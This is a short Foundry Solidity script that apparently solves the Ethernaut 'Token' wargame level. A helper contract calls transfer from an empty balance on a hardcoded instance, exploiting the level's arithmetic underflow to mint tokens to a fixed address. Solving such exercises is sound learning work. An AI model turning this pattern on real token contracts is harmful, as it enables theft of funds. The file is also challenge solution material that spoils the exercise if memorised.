//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Token} from "../src/ethernaut5.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut5Script is Script{
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        new attackScript();

        vm.stopBroadcast();
    }
}
contract attackScript{
    Token instance = Token(payable(0x102dD7711A2bec7A661f6aB3597D2a1178475A79));
    constructor() public{
        console.log(instance.balanceOf(0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779));
        instance.transfer(0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779, 100);
        console.log(instance.balanceOf(0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779));
    }
}